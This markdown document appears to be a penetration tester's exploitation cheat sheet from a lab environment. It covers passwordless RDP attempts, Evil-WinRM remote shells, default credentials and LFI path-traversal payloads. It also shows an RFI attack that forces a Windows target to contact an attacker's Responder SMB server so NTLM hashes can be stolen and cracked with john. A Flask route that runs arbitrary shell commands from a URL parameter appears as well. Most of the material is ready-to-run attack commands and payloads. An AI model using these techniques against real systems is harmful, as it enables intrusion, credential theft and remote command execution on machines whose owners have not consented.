# Exploitation

## Network

### Remote Desktop Protocol (3389)
You can start by attempting to connect using a tool like xfreerdp
### xfreerdp
Sometimes the user has no password configured, it's worth testing.
```shell
xfreerdp /v:10.129.175.116 /cert:ignore /u:Administrator
```

### WinRN (5985)
Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol where we can potentially get a PowerShell shell on the host using something like Evil-WinRM.
```shell
evil-winrm -i {ip address} -u {user} -p {password}
```

## Web Applications

Payloads Git Repo: https://github.com/swisskyrepo/PayloadsAllTheThings

Connecting to a web server
```shell
nc {ip address} 80
```

### Login Page
First, we look for any low hanging fruits. 

<b>Default credentials</b>

nginx
```shell
admin:admin
```




### LFI/RFI
Local file inclusion, and remote file inclusion

On windows servers we can attempt to view the hosts file. This file aids in the local translation of host names to IP addresses
```shell
WINDOWS\System32\drivers\etc\hosts
```
Payload Example
```shell
../../../../../../../../windows/system32/drivers/etc/hosts
```

<b>Exploiting RFI using an SMB server with Responder</b>

Even with allow_url_include and allow_url_fopen are set to "off" in the php.ini config file. SMB servers can still be loaded, then used to steal NTLM hashes. 
```shell
responder -I tun0
```
Then grab the IP generated from responder and attempt to load it using the RFI vulnerability.
```shell
http://{hostname}/?page=//{responder_ip}/somefile
```
We may still get an error on the web page but responder should recieve the hash. Let's use john the ripper next.
```shell
echo {hash} > hash.txt  # save the hash in a .txt file
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
We can then try to connect to the WinRM service on the target and try to get a session. Because PowerShell isn't installed
on Linux by default, we'll use a tool called Evil-WinRM which is made for this kind of scenario. See WinRM above.


<b>Python Flask</b>

Python Flask File Upload Reverse Shell - https://www.youtube.com/watch?v=-BJU7gJTNwk
```python
@app.route('/shell')
def cmd():
    return os.system(request.args.get('cmd'))

http://url.com/shell?cmd=ping+-c1+10.10.10.10 #myip
```